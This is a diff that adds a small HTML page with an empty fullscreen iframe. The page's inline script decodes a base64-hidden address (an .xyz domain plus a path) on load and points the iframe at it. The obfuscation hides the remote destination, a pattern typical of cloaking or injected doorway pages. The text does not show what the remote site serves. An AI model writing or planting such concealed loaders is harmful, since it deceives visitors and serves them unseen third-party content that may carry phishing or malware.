@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="author" content="amelovy">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="/assets/gayaa.css" />
+</head>
+<body>
+<div class="iframe-container">
+<iframe id="ngent" allowfullscreen></iframe>
+</div>
+</body>
+<script type="text/javascript">
+  document.addEventListener("DOMContentLoaded", function () {
+  var params = new URLSearchParams(window.location.search);
+    var rabi = "mila-herun";
+    var base = "aHR0cHM6Ly93d3cua2FsYWhhcnUueHl6Lw==";
+    var awkey = window.atob(base) + rabi;
+    var value = document.getElementById("ngent").src;
+    document.getElementById("ngent").setAttribute("src", awkey);
+});
+</script>
+</html>
